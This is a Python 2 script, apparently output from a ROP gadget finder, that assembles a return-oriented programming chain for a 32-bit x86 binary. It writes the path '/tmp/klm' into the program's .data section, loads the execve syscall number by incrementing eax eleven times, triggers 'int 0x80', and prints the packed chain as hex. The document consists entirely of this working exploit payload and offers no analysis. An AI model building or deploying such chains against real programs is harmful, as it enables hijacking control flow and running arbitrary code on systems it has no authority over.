# ROP chain generation
# ===========================================================
#
# - Step 1 -- Write-what-where gadgets
#
# 	[+] Gadget found: 0x80790c1 mov dword ptr [edx], eax ; ret
# 	[+] Gadget found: 0x8051646 pop edx ; ret
# 	[+] Gadget found: 0x80a7d36 pop eax ; ret
# 	[+] Gadget found: 0x80975df xor eax, eax ; ret
#
# - Step 2 -- Init syscall number gadgets
#
# 	[+] Gadget found: 0x80975df xor eax, eax ; ret
# 	[+] Gadget found: 0x805378e inc eax ; ret
#
# - Step 3 -- Init syscall arguments gadgets
#
# 	[+] Gadget found: 0x805166e pop ebx ; ret
# 	[+] Gadget found: 0x805166d pop ecx ; pop ebx ; ret
# 	[+] Gadget found: 0x8051646 pop edx ; ret
#
# - Step 4 -- Syscall gadget
#
# 	[+] Gadget found: 0x804898d int 0x80

from struct import pack


p = ''

p += pack('<I', 0x8051646) # pop edx ; ret
p += pack('<I', 0x80c97e0) # @ .data
p += pack('<I', 0x80a7d36) # pop eax ; ret
p += '/tmp'
p += pack('<I', 0x80790c1) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x8051646) # pop edx ; ret
p += pack('<I', 0x80c97e4) # @ .data + 4
p += pack('<I', 0x80a7d36) # pop eax ; ret
p += '/klm'
p += pack('<I', 0x80790c1) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x8051646) # pop edx ; ret
p += pack('<I', 0x80c97e8) # @ .data + 8
p += pack('<I', 0x80975df) # xor eax, eax ; ret
p += pack('<I', 0x80790c1) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x805166e) # pop ebx ; ret
p += pack('<I', 0x80c97e0) # @ .data
p += pack('<I', 0x805166d) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x80c97e8) # @ .data + 8
p += pack('<I', 0x80c97e0) # padding without overwrite ebx
p += pack('<I', 0x8051646) # pop edx ; ret
p += pack('<I', 0x80c97e8) # @ .data + 8
p += pack('<I', 0x80975df) # xor eax, eax ; ret
p += pack('<I', 0x805378e) # inc eax ; ret
p += pack('<I', 0x805378e) # inc eax ; ret
p += pack('<I', 0x805378e) # inc eax ; ret
p += pack('<I', 0x805378e) # inc eax ; ret
p += pack('<I', 0x805378e) # inc eax ; ret
p += pack('<I', 0x805378e) # inc eax ; ret
p += pack('<I', 0x805378e) # inc eax ; ret
p += pack('<I', 0x805378e) # inc eax ; ret
p += pack('<I', 0x805378e) # inc eax ; ret
p += pack('<I', 0x805378e) # inc eax ; ret
p += pack('<I', 0x805378e) # inc eax ; ret
p += pack('<I', 0x804898d) # int 0x80

import binascii

print binascii.hexlify(p)
